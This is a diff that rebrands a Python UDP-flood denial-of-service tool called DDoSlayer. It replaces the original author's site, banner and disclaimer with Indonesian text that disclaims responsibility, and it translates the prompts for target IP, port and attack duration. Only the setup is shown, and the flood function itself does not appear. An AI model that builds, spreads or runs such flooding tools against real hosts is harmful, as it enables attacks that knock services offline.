@@ -11,26 +11,24 @@ os.system("figlet DDoSlayer")
 
 print()
 print(colored("Author   : 25 'NvyAS' Abou-Chabke", 'green'))
-print(colored("Website : https://www.blackhatethicalhacking.com", 'magenta'))
-print(colored("Offense is always the best defense!", 'magenta'))
-print(colored("This tool is written for Educational purposes only - helping the defensive team look into how such attacks take place.", 'cyan'))
-print(colored("BHEH Is not responsible for misusing it and must have an NDA signed to perform such attacks", 'red'))
-print(colored("You are using DDoSlayer Version: 2.0", 'yellow'))
+print(colored("Tool ini dibuat untuk edukasi dan pengujian suatu project.", 'cyan'))
+print(colored("Kami Tidak bertangungjawab atas penyalahgunaan Tool ini !!!", 'red'))
+print(colored("Versi 2.0 DDoS7layer-nvy", 'yellow'))
 print()
 
 # Prompt for target IP and port
-ip = input("Enter the target IP: ")
+ip = input("Masukan IP target: ")
 try:
-    port = int(input("Enter the target port: "))
+    port = int(input("Masukan port target: "))
 except ValueError:
-    print("Invalid port. Exiting...")
+    print("port tidak valid. keluar...")
     sys.exit()
 
 # Prompt for attack duration
 try:
-    dur = int(input("Enter the duration of the attack in seconds: "))
+    dur = int(input("Masukkan durasi serangan dalam hitungan detik: "))
 except ValueError:
-    print("Invalid duration. Exiting...")
+    print("Durasi tidak valid. keluar...")
     sys.exit()
 
 # Function to perform the UDP Flood attack
